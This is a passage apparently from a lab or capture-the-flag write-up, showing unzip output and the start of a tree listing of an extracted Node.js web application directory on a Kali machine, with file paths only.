  inflating: var/www/myplace/node_modules/inherits/inherits.js
  inflating: var/www/myplace/node_modules/inherits/inherits_browser.js
   creating: var/www/myplace/node_modules/vary/
  inflating: var/www/myplace/node_modules/vary/README.md
  inflating: var/www/myplace/node_modules/vary/index.js
  inflating: var/www/myplace/node_modules/vary/LICENSE
  inflating: var/www/myplace/node_modules/vary/HISTORY.md
  inflating: var/www/myplace/node_modules/vary/package.json
   creating: var/www/myplace/node_modules/send/
  inflating: var/www/myplace/node_modules/send/README.md
  inflating: var/www/myplace/node_modules/send/index.js
  inflating: var/www/myplace/node_modules/send/LICENSE
   creating: var/www/myplace/node_modules/send/node_modules/
   creating: var/www/myplace/node_modules/send/node_modules/debug/
  inflating: var/www/myplace/node_modules/send/node_modules/debug/CHANGELOG.md
  inflating: var/www/myplace/node_modules/send/node_modules/debug/README.md
 extracting: var/www/myplace/node_modules/send/node_modules/debug/node.js
  inflating: var/www/myplace/node_modules/send/node_modules/debug/LICENSE
  inflating: var/www/myplace/node_modules/send/node_modules/debug/.eslintrc
  inflating: var/www/myplace/node_modules/send/node_modules/debug/component.json
  inflating: var/www/myplace/node_modules/send/node_modules/debug/.travis.yml
  inflating: var/www/myplace/node_modules/send/node_modules/debug/package.json
  inflating: var/www/myplace/node_modules/send/node_modules/debug/Makefile
   creating: var/www/myplace/node_modules/send/node_modules/debug/src/
  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/index.js
  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/node.js
  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/debug.js
  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/browser.js
 extracting: var/www/myplace/node_modules/send/node_modules/debug/.coveralls.yml
  inflating: var/www/myplace/node_modules/send/node_modules/debug/.npmignore
  inflating: var/www/myplace/node_modules/send/node_modules/debug/karma.conf.js
  inflating: var/www/myplace/node_modules/send/HISTORY.md
  inflating: var/www/myplace/node_modules/send/package.json
   creating: var/www/myplace/node_modules/uid-safe/
  inflating: var/www/myplace/node_modules/uid-safe/README.md
  inflating: var/www/myplace/node_modules/uid-safe/index.js
  inflating: var/www/myplace/node_modules/uid-safe/LICENSE
  inflating: var/www/myplace/node_modules/uid-safe/HISTORY.md
  inflating: var/www/myplace/node_modules/uid-safe/package.json
   creating: var/www/myplace/node_modules/proxy-addr/
  inflating: var/www/myplace/node_modules/proxy-addr/README.md
  inflating: var/www/myplace/node_modules/proxy-addr/index.js
  inflating: var/www/myplace/node_modules/proxy-addr/LICENSE
  inflating: var/www/myplace/node_modules/proxy-addr/HISTORY.md
  inflating: var/www/myplace/node_modules/proxy-addr/package.json
   creating: var/www/myplace/node_modules/buffer-shims/
  inflating: var/www/myplace/node_modules/buffer-shims/index.js
  inflating: var/www/myplace/node_modules/buffer-shims/license.md
  inflating: var/www/myplace/node_modules/buffer-shims/package.json
  inflating: var/www/myplace/node_modules/buffer-shims/readme.md
   creating: var/www/myplace/node_modules/bson/
   creating: var/www/myplace/node_modules/bson/browser_build/
  inflating: var/www/myplace/node_modules/bson/browser_build/package.json
  inflating: var/www/myplace/node_modules/bson/browser_build/bson.js
  inflating: var/www/myplace/node_modules/bson/README.md
  inflating: var/www/myplace/node_modules/bson/index.js
  inflating: var/www/myplace/node_modules/bson/HISTORY.md
   creating: var/www/myplace/node_modules/bson/lib/
   creating: var/www/myplace/node_modules/bson/lib/bson/
  inflating: var/www/myplace/node_modules/bson/lib/bson/int_32.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/timestamp.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/code.js
   creating: var/www/myplace/node_modules/bson/lib/bson/parser/
  inflating: var/www/myplace/node_modules/bson/lib/bson/parser/calculate_size.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/parser/deserializer.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/parser/serializer.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/long.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/double.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/regexp.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/objectid.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/decimal128.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/bson.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/min_key.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/binary.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/max_key.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/symbol.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/map.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/db_ref.js
  inflating: var/www/myplace/node_modules/bson/lib/bson/float_parser.js
  inflating: var/www/myplace/node_modules/bson/package.json
  inflating: var/www/myplace/node_modules/bson/bower.json
  inflating: var/www/myplace/node_modules/bson/LICENSE.md
   creating: var/www/myplace/node_modules/semver/
  inflating: var/www/myplace/node_modules/semver/README.md
  inflating: var/www/myplace/node_modules/semver/semver.js
  inflating: var/www/myplace/node_modules/semver/LICENSE
  inflating: var/www/myplace/node_modules/semver/package.json
  inflating: var/www/myplace/node_modules/semver/range.bnf
   creating: var/www/myplace/node_modules/semver/bin/
  inflating: var/www/myplace/node_modules/semver/bin/semver
   creating: var/www/myplace/node_modules/bytes/
  inflating: var/www/myplace/node_modules/bytes/History.md
  inflating: var/www/myplace/node_modules/bytes/Readme.md
  inflating: var/www/myplace/node_modules/bytes/index.js
  inflating: var/www/myplace/node_modules/bytes/LICENSE
  inflating: var/www/myplace/node_modules/bytes/package.json
   creating: var/www/myplace/node_modules/es6-promise/
  inflating: var/www/myplace/node_modules/es6-promise/CHANGELOG.md
  inflating: var/www/myplace/node_modules/es6-promise/README.md
  inflating: var/www/myplace/node_modules/es6-promise/LICENSE
   creating: var/www/myplace/node_modules/es6-promise/dist/
  inflating: var/www/myplace/node_modules/es6-promise/dist/es6-promise.min.js
  inflating: var/www/myplace/node_modules/es6-promise/dist/es6-promise.js
   creating: var/www/myplace/node_modules/es6-promise/lib/
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise.umd.js
   creating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/enumerator.js
   creating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/all.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/resolve.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/reject.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/race.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/utils.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/then.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/polyfill.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/asap.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise.js
  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/-internal.js
  inflating: var/www/myplace/node_modules/es6-promise/package.json
   creating: var/www/myplace/node_modules/destroy/
  inflating: var/www/myplace/node_modules/destroy/README.md
  inflating: var/www/myplace/node_modules/destroy/index.js
  inflating: var/www/myplace/node_modules/destroy/LICENSE
  inflating: var/www/myplace/node_modules/destroy/package.json
   creating: var/www/myplace/node_modules/mongodb/
  inflating: var/www/myplace/node_modules/mongodb/THIRD-PARTY-NOTICES
  inflating: var/www/myplace/node_modules/mongodb/README.md
  inflating: var/www/myplace/node_modules/mongodb/index.js
  inflating: var/www/myplace/node_modules/mongodb/LICENSE
  inflating: var/www/myplace/node_modules/mongodb/boot_auth.js
  inflating: var/www/myplace/node_modules/mongodb/HISTORY.md
   creating: var/www/myplace/node_modules/mongodb/lib/
  inflating: var/www/myplace/node_modules/mongodb/lib/admin.js
  inflating: var/www/myplace/node_modules/mongodb/lib/server.js
  inflating: var/www/myplace/node_modules/mongodb/lib/replset.js
   creating: var/www/myplace/node_modules/mongodb/lib/gridfs/
  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs/chunk.js
  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs/grid_store.js
  inflating: var/www/myplace/node_modules/mongodb/lib/read_preference.js
  inflating: var/www/myplace/node_modules/mongodb/lib/apm.js
  inflating: var/www/myplace/node_modules/mongodb/lib/url_parser.js
  inflating: var/www/myplace/node_modules/mongodb/lib/collection.js
   creating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/
  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/upload.js
  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/index.js
  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/download.js
  inflating: var/www/myplace/node_modules/mongodb/lib/db.js
  inflating: var/www/myplace/node_modules/mongodb/lib/aggregation_cursor.js
  inflating: var/www/myplace/node_modules/mongodb/lib/metadata.js
  inflating: var/www/myplace/node_modules/mongodb/lib/utils.js
   creating: var/www/myplace/node_modules/mongodb/lib/bulk/
  inflating: var/www/myplace/node_modules/mongodb/lib/bulk/ordered.js
  inflating: var/www/myplace/node_modules/mongodb/lib/bulk/unordered.js
  inflating: var/www/myplace/node_modules/mongodb/lib/bulk/common.js
  inflating: var/www/myplace/node_modules/mongodb/lib/mongos.js
  inflating: var/www/myplace/node_modules/mongodb/lib/command_cursor.js
  inflating: var/www/myplace/node_modules/mongodb/lib/cursor.js
  inflating: var/www/myplace/node_modules/mongodb/lib/topology_base.js
  inflating: var/www/myplace/node_modules/mongodb/lib/mongo_client.js
  inflating: var/www/myplace/node_modules/mongodb/lib/authenticate.js
  inflating: var/www/myplace/node_modules/mongodb/yarn.lock
  inflating: var/www/myplace/node_modules/mongodb/.eslintrc
  inflating: var/www/myplace/node_modules/mongodb/package.json
  inflating: var/www/myplace/node_modules/mongodb/Makefile
  inflating: var/www/myplace/node_modules/mongodb/conf.json
 extracting: var/www/myplace/node_modules/mongodb/.coveralls.yml
  inflating: var/www/myplace/node_modules/mongodb/insert_bench.js
   creating: var/www/myplace/node_modules/path-to-regexp/
  inflating: var/www/myplace/node_modules/path-to-regexp/History.md
  inflating: var/www/myplace/node_modules/path-to-regexp/Readme.md
  inflating: var/www/myplace/node_modules/path-to-regexp/index.js
  inflating: var/www/myplace/node_modules/path-to-regexp/LICENSE
  inflating: var/www/myplace/node_modules/path-to-regexp/package.json
   creating: var/www/myplace/node_modules/isarray/
  inflating: var/www/myplace/node_modules/isarray/README.md
  inflating: var/www/myplace/node_modules/isarray/index.js
  inflating: var/www/myplace/node_modules/isarray/component.json
  inflating: var/www/myplace/node_modules/isarray/test.js
  inflating: var/www/myplace/node_modules/isarray/.travis.yml
  inflating: var/www/myplace/node_modules/isarray/package.json
  inflating: var/www/myplace/node_modules/isarray/Makefile
 extracting: var/www/myplace/node_modules/isarray/.npmignore
   creating: var/www/myplace/node_modules/process-nextick-args/
  inflating: var/www/myplace/node_modules/process-nextick-args/index.js
  inflating: var/www/myplace/node_modules/process-nextick-args/license.md
  inflating: var/www/myplace/node_modules/process-nextick-args/test.js
  inflating: var/www/myplace/node_modules/process-nextick-args/.travis.yml
  inflating: var/www/myplace/node_modules/process-nextick-args/package.json
  inflating: var/www/myplace/node_modules/process-nextick-args/readme.md
   creating: var/www/myplace/node_modules/core-util-is/
  inflating: var/www/myplace/node_modules/core-util-is/README.md
  inflating: var/www/myplace/node_modules/core-util-is/LICENSE
   creating: var/www/myplace/node_modules/core-util-is/lib/
  inflating: var/www/myplace/node_modules/core-util-is/lib/util.js
  inflating: var/www/myplace/node_modules/core-util-is/test.js
  inflating: var/www/myplace/node_modules/core-util-is/package.json
  inflating: var/www/myplace/node_modules/core-util-is/float.patch
   creating: var/www/myplace/node_modules/body-parser/
  inflating: var/www/myplace/node_modules/body-parser/README.md
  inflating: var/www/myplace/node_modules/body-parser/index.js
  inflating: var/www/myplace/node_modules/body-parser/LICENSE
  inflating: var/www/myplace/node_modules/body-parser/HISTORY.md
   creating: var/www/myplace/node_modules/body-parser/lib/
  inflating: var/www/myplace/node_modules/body-parser/lib/read.js
   creating: var/www/myplace/node_modules/body-parser/lib/types/
  inflating: var/www/myplace/node_modules/body-parser/lib/types/urlencoded.js
  inflating: var/www/myplace/node_modules/body-parser/lib/types/raw.js
  inflating: var/www/myplace/node_modules/body-parser/lib/types/json.js
  inflating: var/www/myplace/node_modules/body-parser/lib/types/text.js
  inflating: var/www/myplace/node_modules/body-parser/package.json
   creating: var/www/myplace/node_modules/on-finished/
  inflating: var/www/myplace/node_modules/on-finished/README.md
  inflating: var/www/myplace/node_modules/on-finished/index.js
  inflating: var/www/myplace/node_modules/on-finished/LICENSE
  inflating: var/www/myplace/node_modules/on-finished/HISTORY.md
  inflating: var/www/myplace/node_modules/on-finished/package.json
   creating: var/www/myplace/node_modules/encodeurl/
  inflating: var/www/myplace/node_modules/encodeurl/README.md
  inflating: var/www/myplace/node_modules/encodeurl/index.js
  inflating: var/www/myplace/node_modules/encodeurl/LICENSE
  inflating: var/www/myplace/node_modules/encodeurl/HISTORY.md
  inflating: var/www/myplace/node_modules/encodeurl/package.json
   creating: var/www/myplace/node_modules/type-is/
  inflating: var/www/myplace/node_modules/type-is/README.md
  inflating: var/www/myplace/node_modules/type-is/index.js
  inflating: var/www/myplace/node_modules/type-is/LICENSE
  inflating: var/www/myplace/node_modules/type-is/HISTORY.md
  inflating: var/www/myplace/node_modules/type-is/package.json
   creating: var/www/myplace/node_modules/parseurl/
  inflating: var/www/myplace/node_modules/parseurl/README.md
  inflating: var/www/myplace/node_modules/parseurl/index.js
  inflating: var/www/myplace/node_modules/parseurl/LICENSE
  inflating: var/www/myplace/node_modules/parseurl/HISTORY.md
  inflating: var/www/myplace/node_modules/parseurl/package.json
   creating: var/www/myplace/node_modules/resolve-from/
  inflating: var/www/myplace/node_modules/resolve-from/index.js
  inflating: var/www/myplace/node_modules/resolve-from/package.json
  inflating: var/www/myplace/node_modules/resolve-from/readme.md
  inflating: var/www/myplace/node_modules/resolve-from/license
   creating: var/www/myplace/node_modules/forwarded/
  inflating: var/www/myplace/node_modules/forwarded/README.md
  inflating: var/www/myplace/node_modules/forwarded/index.js
  inflating: var/www/myplace/node_modules/forwarded/LICENSE
  inflating: var/www/myplace/node_modules/forwarded/HISTORY.md
  inflating: var/www/myplace/node_modules/forwarded/package.json
   creating: var/www/myplace/node_modules/content-type/
  inflating: var/www/myplace/node_modules/content-type/README.md
  inflating: var/www/myplace/node_modules/content-type/index.js
  inflating: var/www/myplace/node_modules/content-type/LICENSE
  inflating: var/www/myplace/node_modules/content-type/HISTORY.md
  inflating: var/www/myplace/node_modules/content-type/package.json
   creating: var/www/myplace/node_modules/random-bytes/
  inflating: var/www/myplace/node_modules/random-bytes/README.md
  inflating: var/www/myplace/node_modules/random-bytes/index.js
  inflating: var/www/myplace/node_modules/random-bytes/LICENSE
  inflating: var/www/myplace/node_modules/random-bytes/HISTORY.md
  inflating: var/www/myplace/node_modules/random-bytes/package.json
   creating: var/www/myplace/node_modules/raw-body/
  inflating: var/www/myplace/node_modules/raw-body/README.md
  inflating: var/www/myplace/node_modules/raw-body/index.js
  inflating: var/www/myplace/node_modules/raw-body/LICENSE
  inflating: var/www/myplace/node_modules/raw-body/HISTORY.md
  inflating: var/www/myplace/node_modules/raw-body/package.json
   creating: var/www/myplace/node_modules/crc/
  inflating: var/www/myplace/node_modules/crc/README.md
  inflating: var/www/myplace/node_modules/crc/LICENSE
   creating: var/www/myplace/node_modules/crc/lib/
  inflating: var/www/myplace/node_modules/crc/lib/index.js
  inflating: var/www/myplace/node_modules/crc/lib/crc8_1wire.js
  inflating: var/www/myplace/node_modules/crc/lib/crc16_ccitt.js
  inflating: var/www/myplace/node_modules/crc/lib/crc16_kermit.js
  inflating: var/www/myplace/node_modules/crc/lib/crc1.js
  inflating: var/www/myplace/node_modules/crc/lib/crc16_modbus.js
  inflating: var/www/myplace/node_modules/crc/lib/crc24.js
  inflating: var/www/myplace/node_modules/crc/lib/crc8.js
  inflating: var/www/myplace/node_modules/crc/lib/create_buffer.js
  inflating: var/www/myplace/node_modules/crc/lib/crc16.js
  inflating: var/www/myplace/node_modules/crc/lib/crc16_xmodem.js
  inflating: var/www/myplace/node_modules/crc/lib/define_crc.js
  inflating: var/www/myplace/node_modules/crc/lib/crc32.js
  inflating: var/www/myplace/node_modules/crc/package.json
   creating: var/www/myplace/node_modules/accepts/
  inflating: var/www/myplace/node_modules/accepts/README.md
  inflating: var/www/myplace/node_modules/accepts/index.js
  inflating: var/www/myplace/node_modules/accepts/LICENSE
  inflating: var/www/myplace/node_modules/accepts/HISTORY.md
  inflating: var/www/myplace/node_modules/accepts/package.json
   creating: var/www/myplace/node_modules/fresh/
  inflating: var/www/myplace/node_modules/fresh/README.md
  inflating: var/www/myplace/node_modules/fresh/index.js
  inflating: var/www/myplace/node_modules/fresh/LICENSE
  inflating: var/www/myplace/node_modules/fresh/HISTORY.md
  inflating: var/www/myplace/node_modules/fresh/package.json
   creating: var/www/myplace/node_modules/mime-db/
  inflating: var/www/myplace/node_modules/mime-db/README.md
  inflating: var/www/myplace/node_modules/mime-db/index.js
  inflating: var/www/myplace/node_modules/mime-db/LICENSE
  inflating: var/www/myplace/node_modules/mime-db/HISTORY.md
  inflating: var/www/myplace/node_modules/mime-db/package.json
  inflating: var/www/myplace/node_modules/mime-db/db.json
   creating: var/www/myplace/node_modules/setprototypeof/
  inflating: var/www/myplace/node_modules/setprototypeof/README.md
  inflating: var/www/myplace/node_modules/setprototypeof/index.js
  inflating: var/www/myplace/node_modules/setprototypeof/LICENSE
  inflating: var/www/myplace/node_modules/setprototypeof/package.json
   creating: var/www/myplace/node_modules/mongodb-core/
  inflating: var/www/myplace/node_modules/mongodb-core/THIRD-PARTY-NOTICES
  inflating: var/www/myplace/node_modules/mongodb-core/README.md
  inflating: var/www/myplace/node_modules/mongodb-core/index.js
  inflating: var/www/myplace/node_modules/mongodb-core/LICENSE
  inflating: var/www/myplace/node_modules/mongodb-core/HISTORY.md
   creating: var/www/myplace/node_modules/mongodb-core/lib/
   creating: var/www/myplace/node_modules/mongodb-core/lib/tools/
  inflating: var/www/myplace/node_modules/mongodb-core/lib/tools/smoke_plugin.js
   creating: var/www/myplace/node_modules/mongodb-core/lib/auth/
  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/gssapi.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/mongocr.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/sspi.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/plain.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/scram.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/auth/x509.js
   creating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/
  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/shared.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/3_2_support.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/commands.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/2_4_support.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/wireprotocol/2_6_support.js
   creating: var/www/myplace/node_modules/mongodb-core/lib/topologies/
  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/server.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/shared.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/replset.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/read_preference.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/mongos.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/topologies/replset_state.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/utils.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/cursor.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/error.js
   creating: var/www/myplace/node_modules/mongodb-core/lib/connection/
  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/logger.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/commands.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/command_result.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/utils.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/connection.js
  inflating: var/www/myplace/node_modules/mongodb-core/lib/connection/pool.js
  inflating: var/www/myplace/node_modules/mongodb-core/.eslintrc
  inflating: var/www/myplace/node_modules/mongodb-core/test1.js
  inflating: var/www/myplace/node_modules/mongodb-core/test.js
  inflating: var/www/myplace/node_modules/mongodb-core/package.json
  inflating: var/www/myplace/node_modules/mongodb-core/Makefile
  inflating: var/www/myplace/node_modules/mongodb-core/conf.json
 extracting: var/www/myplace/node_modules/mongodb-core/.coveralls.yml
  inflating: var/www/myplace/node_modules/mongodb-core/TESTING.md
   creating: var/www/myplace/node_modules/http-errors/
  inflating: var/www/myplace/node_modules/http-errors/README.md
  inflating: var/www/myplace/node_modules/http-errors/index.js
  inflating: var/www/myplace/node_modules/http-errors/LICENSE
  inflating: var/www/myplace/node_modules/http-errors/HISTORY.md
  inflating: var/www/myplace/node_modules/http-errors/package.json
  inflating: var/www/myplace/package.json
  inflating: var/www/myplace/app.js
   creating: var/www/myplace/static/
   creating: var/www/myplace/static/uploads/
  inflating: var/www/myplace/static/uploads/mark.jpg
  inflating: var/www/myplace/static/uploads/myP14ceAdm1nAcc0uNT.jpg
  inflating: var/www/myplace/static/uploads/tom.jpg
  inflating: var/www/myplace/static/uploads/rastating.jpg
   creating: var/www/myplace/static/vendor/
   creating: var/www/myplace/static/vendor/font-awesome/
   creating: var/www/myplace/static/vendor/font-awesome/scss/
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_rotated-flipped.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_screen-reader.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_mixins.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/font-awesome.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_fixed-width.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_larger.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_bordered-pulled.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_list.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_variables.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_core.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_animated.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_path.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_stacked.scss
  inflating: var/www/myplace/static/vendor/font-awesome/scss/_icons.scss
   creating: var/www/myplace/static/vendor/font-awesome/css/
  inflating: var/www/myplace/static/vendor/font-awesome/css/font-awesome.min.css
  inflating: var/www/myplace/static/vendor/font-awesome/css/font-awesome.css
   creating: var/www/myplace/static/vendor/font-awesome/fonts/
  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.eot
  inflating: var/www/myplace/static/vendor/font-awesome/fonts/FontAwesome.otf
  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.woff
  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.ttf
  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.woff2
  inflating: var/www/myplace/static/vendor/font-awesome/fonts/fontawesome-webfont.svg
   creating: var/www/myplace/static/vendor/font-awesome/less/
  inflating: var/www/myplace/static/vendor/font-awesome/less/bordered-pulled.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/screen-reader.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/core.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/rotated-flipped.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/variables.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/larger.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/path.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/list.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/fixed-width.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/icons.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/mixins.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/animated.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/stacked.less
  inflating: var/www/myplace/static/vendor/font-awesome/less/font-awesome.less
   creating: var/www/myplace/static/vendor/jquery/
  inflating: var/www/myplace/static/vendor/jquery/jquery.min.js
  inflating: var/www/myplace/static/vendor/jquery/jquery.js
   creating: var/www/myplace/static/vendor/angular/
  inflating: var/www/myplace/static/vendor/angular/angular-route.min.js
  inflating: var/www/myplace/static/vendor/angular/angular.min.js
   creating: var/www/myplace/static/vendor/bootstrap/
   creating: var/www/myplace/static/vendor/bootstrap/css/
  inflating: var/www/myplace/static/vendor/bootstrap/css/bootstrap.min.css
  inflating: var/www/myplace/static/vendor/bootstrap/css/bootstrap.css
   creating: var/www/myplace/static/vendor/bootstrap/fonts/
  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.eot
  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.svg
  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.ttf
  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.woff
  inflating: var/www/myplace/static/vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2
   creating: var/www/myplace/static/vendor/bootstrap/js/
  inflating: var/www/myplace/static/vendor/bootstrap/js/bootstrap.min.js
  inflating: var/www/myplace/static/vendor/bootstrap/js/bootstrap.js
   creating: var/www/myplace/static/assets/
   creating: var/www/myplace/static/assets/css/
  inflating: var/www/myplace/static/assets/css/freelancer.css
  inflating: var/www/myplace/static/assets/css/app.css
  inflating: var/www/myplace/static/assets/css/freelancer.min.css
   creating: var/www/myplace/static/assets/js/
   creating: var/www/myplace/static/assets/js/misc/
  inflating: var/www/myplace/static/assets/js/misc/freelancer.min.js
   creating: var/www/myplace/static/assets/js/app/
  inflating: var/www/myplace/static/assets/js/app/app.js
   creating: var/www/myplace/static/assets/js/app/controllers/
  inflating: var/www/myplace/static/assets/js/app/controllers/admin.js
  inflating: var/www/myplace/static/assets/js/app/controllers/profile.js
  inflating: var/www/myplace/static/assets/js/app/controllers/login.js
  inflating: var/www/myplace/static/assets/js/app/controllers/home.js
   creating: var/www/myplace/static/partials/
  inflating: var/www/myplace/static/partials/admin.html
  inflating: var/www/myplace/static/partials/login.html
  inflating: var/www/myplace/static/partials/home.html
  inflating: var/www/myplace/static/partials/profile.html
  inflating: var/www/myplace/app.html
root@kali:~/node#
```

```sh
root@kali:~/node/var# tree
.
└── www
    └── myplace
        ├── app.html
        ├── app.js
        ├── node_modules
        │   ├── accepts
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── array-flatten
        │   │   ├── array-flatten.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── body-parser
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── lib
        │   │   │   ├── read.js
        │   │   │   └── types
        │   │   │       ├── json.js
        │   │   │       ├── raw.js
        │   │   │       ├── text.js
        │   │   │       └── urlencoded.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── bson
        │   │   ├── bower.json
        │   │   ├── browser_build
        │   │   │   ├── bson.js
        │   │   │   └── package.json
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── lib
        │   │   │   └── bson
        │   │   │       ├── binary.js
        │   │   │       ├── bson.js
        │   │   │       ├── code.js
        │   │   │       ├── db_ref.js
        │   │   │       ├── decimal128.js
        │   │   │       ├── double.js
        │   │   │       ├── float_parser.js
        │   │   │       ├── int_32.js
        │   │   │       ├── long.js
        │   │   │       ├── map.js
        │   │   │       ├── max_key.js
        │   │   │       ├── min_key.js
        │   │   │       ├── objectid.js
        │   │   │       ├── parser
        │   │   │       │   ├── calculate_size.js
        │   │   │       │   ├── deserializer.js
        │   │   │       │   └── serializer.js
        │   │   │       ├── regexp.js
        │   │   │       ├── symbol.js
        │   │   │       └── timestamp.js
        │   │   ├── LICENSE.md
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── buffer-shims
        │   │   ├── index.js
        │   │   ├── license.md
        │   │   ├── package.json
        │   │   └── readme.md
        │   ├── bytes
        │   │   ├── History.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── Readme.md
        │   ├── content-disposition
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── content-type
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── cookie
        │   │   ├── HISTORY.md
        │   │   ├── index.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   └── README.md
        │   ├── cookie-signature
        │   │   ├── History.md
        │   │   ├── index.js
        │   │   ├── package.json
        │   │   └── Readme.md
        │   ├── core-util-is
        │   │   ├── float.patch
        │   │   ├── lib
        │   │   │   └── util.js
        │   │   ├── LICENSE
        │   │   ├── package.json
        │   │   ├── README.md
        │   │   └── test.js
        │   ├── crc
        │   │   ├── lib
